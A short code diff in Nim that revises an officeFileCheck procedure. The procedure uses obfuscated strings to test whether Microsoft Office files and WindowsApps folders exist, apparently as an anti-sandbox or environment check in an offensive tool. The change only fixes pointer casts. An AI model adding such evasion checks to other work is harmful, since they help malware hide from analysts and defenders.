@@ -2691,8 +2691,8 @@ proc officeFileCheck(): void =
     var fileCount: int = 0
     var AppXManifest: string = obf(r"C:\Program Files\Microsoft Office\AppXManifest.xml")
     var dwAttributes: DWORD
-    let wideAppXManifest = newWideCString(AppXManifest)
-    dwAttributes = GetFileAttributesW(cast[LPCWSTR](unsafeAddr wideAppXManifest))
+    var wideAppXManifest: WideCString = newWideCString(AppXManifest)
+    dwAttributes = GetFileAttributesW(cast[LPCWSTR](wideAppXManifest))
     if (dwAttributes != INVALID_FILE_ATTRIBUTES):
         fileCount += 1
         when defined(verbose):
@@ -2703,8 +2703,8 @@ proc officeFileCheck(): void =
     else:
         # check if file "C:\Program Files\Microsoft Office\RappelZapp.xml" exists
         var RappelZapp: string = obf(r"C:\Program Files\Microsoft Office\RappelZapp.xml")
-        let wideRappelZapp = newWideCString(RappelZapp)
-        dwAttributes = GetFileAttributesW(cast[LPCWSTR](unsafeAddr wideRappelZapp))
+        var wideRappelZapp: WideCString = newWideCString(RappelZapp)
+        dwAttributes = GetFileAttributesW(cast[LPCWSTR](wideRappelZapp))
         if dwAttributes != INVALID_FILE_ATTRIBUTES:
             fileCount += 1
             when defined(verbose):
@@ -2716,9 +2716,9 @@ proc officeFileCheck(): void =
     # Now check if C:\\PROGRA~1\\WindowsApps and C:\\PROGRA~2\\WindowsApps exist
     var WindowsApps: string = obf(r"C:\PROGRA~1\WindowsApps")
     var WindowsApps2: string = obf(r"C:\PROGRA~2\WindowsApps")
-    let wideWindowsApps = newWideCString(WindowsApps)
-    let wideWindowsApps2 = newWideCString(WindowsApps2)
-    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](unsafeAddr wideWindowsApps)) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](unsafeAddr wideWindowsApps2))):
+    var wideWindowsApps: WideCString = newWideCString(WindowsApps)
+    var wideWindowsApps2: WideCString = newWideCString(WindowsApps2)
+    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](wideWindowsApps)) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](wideWindowsApps2))):
         fileCount += 1
         when defined(verbose):
             echo obf("[*] File: ") & WindowsApps & obf(" or ") & WindowsApps2 & obf(" exists")
